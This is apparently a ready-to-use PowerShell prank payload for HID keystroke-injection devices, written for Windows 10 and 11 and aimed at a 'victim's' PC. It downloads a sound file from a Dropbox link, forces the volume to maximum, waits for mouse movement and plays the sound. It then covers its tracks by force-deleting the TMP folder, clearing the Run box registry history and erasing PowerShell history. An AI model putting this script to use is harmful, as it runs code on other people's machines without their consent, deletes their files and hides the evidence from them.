############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : Play-WAV          | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
# Dependencies : DropBox           |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#                                                                                                            #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

<#
.NOTES
	This script requires you to have a DropBox account

.DESCRIPTION 
	This program downloads a sound from your DropBox
	Turns the volume to max level on victims PC
	Pauses the script until a mouse movement is detected
	Then plays the sound with nothing popping up catching your victim off guard
	Finally a few lines of script are executed to empty TMP folder, clear Run and Powershell history

#>

############################################################################################################################################################

# Download Sound (When using your own link "dl=0" needs to be changed to "dl=1")
iwr https:// <Your DropBox shared link intended for file> ?dl=1 -O $env:TMP\f.wav

############################################################################################################################################################

# This turns the volume up to max level
$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

############################################################################################################################################################

# The line below this makes the CapsLock indicator light blink however many times you set it to
$blinks = 4
$o=New-Object -ComObject WScript.Shell;for ($num = 1 ; $num -le $blinks*2; $num++){$o.SendKeys("{CAPSLOCK}");Start-Sleep -Milliseconds 250} 


# This while loop will constantly check if the mouse has been moved 
# if the mouse has not moved "SCROLLLOCK" will be pressed to prevent screen from turning off
# it will then sleep for the indicated number of seconds and check again

Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{SCROLLLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
############################################################################################################################################################

# Play Sound 
$PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation="$env:TMP\f.wav";$PlayWav.playsync()

############################################################################################################################################################

# Empty TMP Folder 
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

